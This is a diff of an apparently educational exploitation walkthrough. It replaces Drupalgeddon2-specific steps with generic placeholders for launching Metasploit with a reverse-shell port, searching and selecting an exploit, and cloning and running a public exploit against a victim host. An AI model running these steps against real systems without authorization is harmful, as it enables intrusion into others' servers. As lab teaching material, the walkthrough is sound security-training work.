@@ -49,13 +49,13 @@ Run metasploit container, forward port 4444 (needed for reverse shell), make sur
 
 `docker run -it -p 4444-4450:4444-4450 metasploitframework/metasploit-framework`
 
-Search for the exploit you'd like to use based on nmap results, in this challenge look for Drupal exploits
+Search for the exploit you'd like to use based on nmap results:
 
-`search drupal`
+`search <name of the application you are looking to exploit>`
 
-Select the Drupalgeddon2 exploit from the list
+Select the exploit you are going to use from the search results:
 
-`use exploit/unix/webapp/drupal_drupalgeddon2`
+`use <path/to/the/exploit>`
 
 Set the host and port for the attacker's and victim's machine
 
@@ -83,19 +83,19 @@ Before being ported to Metasploit for easy usage, exploits are usually released 
 
 If the Metasploit option didn't work or you'd like to try another way of exploiting the same vulnerability, here it is:
 
-In this scenario we are going to use the public exploit available here: https://github.com/dreadlocked/Drupalgeddon2
+In this scenario we are going to use a public exploit available on GitHub:
 
 First, you need to clone the repository into your attacker's machine:
 
-`git clone https://github.com/dreadlocked/Drupalgeddon2`
+`git clone <exploit_github>`
 
 Go to the project folder and install the library dependencies:
 
-`cd Drupalgeddon2`
+`cd <exploit_github>`
 
 `sudo gem install highline`
 
 You should be able to excute the exploit like so:
 
-`./drupalgeddon2.rb {VICTIM_IP_OR_URL:VICTIM_PORT}`
+`./exploit.rb {VICTIM_IP_OR_URL:VICTIM_PORT}`
 
